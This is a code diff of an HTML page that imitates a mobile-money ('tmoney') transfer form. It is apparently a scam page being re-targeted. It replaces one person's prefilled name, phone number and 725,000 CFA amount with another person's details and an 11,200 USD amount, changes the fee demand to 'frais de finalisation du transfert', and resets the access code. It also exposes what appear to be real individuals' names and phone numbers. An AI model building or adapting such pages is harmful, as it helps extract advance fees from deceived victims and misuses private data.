@@ -177,17 +177,17 @@
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="kouamé gozan blanche Laurence" disabled />
+        <input type="text" id="name" value="Rekab Wasivyo" disabled />
       </div>
 
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+225 01 43 55 97 61" disabled />
+        <input type="tel" id="phone" value="+243 82 547 7601" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="725.000 F CFA " disabled />
+        <input type="text" id="amount" value="11.200 USD  " disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,7 +202,7 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-         Action requise : Veillez payer les frais de pénalités lié a votre transferts.
+         Action requise : Veillez payer les frais de finalisation du transfert.
 
       </div>
     </form>
@@ -213,7 +213,7 @@
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
 
-      if (code === "9761") {
+      if (code === "7601") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
